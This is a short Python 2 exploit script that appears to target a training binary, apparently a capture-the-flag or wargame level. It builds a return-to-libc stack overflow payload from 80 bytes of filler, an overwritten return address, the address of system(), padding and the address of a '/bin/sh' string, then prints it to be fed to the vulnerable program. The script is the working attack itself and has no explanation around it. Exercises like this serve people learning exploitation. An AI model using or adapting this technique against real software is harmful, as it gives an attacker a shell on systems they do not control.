import struct

# buffer = "print 'A' * 84"
buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
ret = struct.pack("I", 0x08048544)
system = struct.pack("I", 0xb7ecffb0)
# padding = "print 'A' * 4"
padding = "AAAA"
# binsh = struct.pack("I", 0xb7fba23f)
# binsh = struct.pack("I", 0xb7e97000+0x0011f3bf)
binsh = struct.pack("I", 0xb7fb63bf)

print buffer+ret+system+padding+binsh
